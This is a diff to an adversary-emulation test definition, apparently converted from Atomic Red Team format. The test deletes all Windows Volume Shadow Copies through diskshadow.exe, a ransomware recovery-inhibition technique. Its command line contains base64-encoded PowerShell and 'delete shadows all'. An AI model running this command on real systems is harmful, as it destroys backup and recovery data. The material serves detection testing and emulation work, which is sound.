@@ -1,16 +1,15 @@
-- id: f4061dae-78d8-5499-b435-c6a9b415009a
+- requirements: []
   name: Soumaia ART Tests - Windows - Delete Volume Shadow Copies via Diskshadow
   description: Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique is used by numerous ransomware families such as Crytox. The binary is present by default in Windows Server operating systems (since Windows Server 2008). Upon execution, it will delete all shadow copies of the server. (requires elevation)
   tactic: impact
-  technique:
-    attack_id: T1490
-    name: Inhibit System Recovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACgAIQAoAHYAcwBzAGEAZABtAGkAbgAuAGUAeABlACAAbABpAHMAdAAgAHMAaABhAGQAbwB3AHMAIAB8ACAAZgBpAG4AZABzAHQAcgAgACIATgBvACAAaQB0AGUAbQBzACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAHMAYQB0AGkAcwBmAHkAIAB0AGgAZQAgAHEAdQBlAHIAeQAuACIAKQApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand dgBzAHMAYQBkAG0AaQBuAC4AZQB4AGUAIABjAHIAZQBhAHQAZQAgAHMAaABhAGQAbwB3ACAALwBmAG8AcgA9AGMAOgAKAA==
-          }
-          "delete shadows all" | diskshadow.exe
+  technique_id: T1490
+  technique_name: Inhibit System Recovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACgAIQAoAHYAcwBzAGEAZABtAGkAbgAuAGUAeABlACAAbABpAHMAdAAgAHMAaABhAGQAbwB3AHMAIAB8ACAAZgBpAG4AZABzAHQAcgAgACIATgBvACAAaQB0AGUAbQBzACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAHMAYQB0AGkAcwBmAHkAIAB0AGgAZQAgAHEAdQBlAHIAeQAuACIAKQApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand dgBzAHMAYQBkAG0AaQBuAC4AZQB4AGUAIABjAHIAZQBhAHQAZQAgAHMAaABhAGQAbwB3ACAALwBmAG8AcgA9AGMAOgAKAA== }; "delete shadows all" | diskshadow.exe
+  id: f4061dae-78d8-5499-b435-c6a9b415009a
